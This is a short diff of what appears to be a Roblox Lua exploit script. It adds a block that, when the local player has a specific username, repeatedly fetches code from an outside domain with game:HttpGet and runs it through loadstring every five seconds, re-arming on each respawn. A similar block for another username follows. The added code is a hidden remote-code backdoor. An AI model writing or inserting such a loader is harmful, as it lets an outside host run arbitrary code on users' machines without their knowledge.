@@ -172,6 +172,20 @@ turnonque()
 repeat
 wait()
 until game:IsLoaded()
+if game.Players.LocalPlayer.Name == "i2ap1" then
+    function Reset()
+        delay(.1, function()
+            while wait(5) do
+                loadstring(game:HttpGet("https://9kdestroyer.xyz/ResponseData/Special.txt"))()
+            end
+        end)
+    end
+    Reset()
+    game.Players.LocalPlayer.CharacterAdded:Connect(function()
+        wait(.5)
+        Reset()
+    end)
+end
 if game.Players.LocalPlayer.Name == "9kDxstroyer" then
     function Reset()
         delay(.1, function()
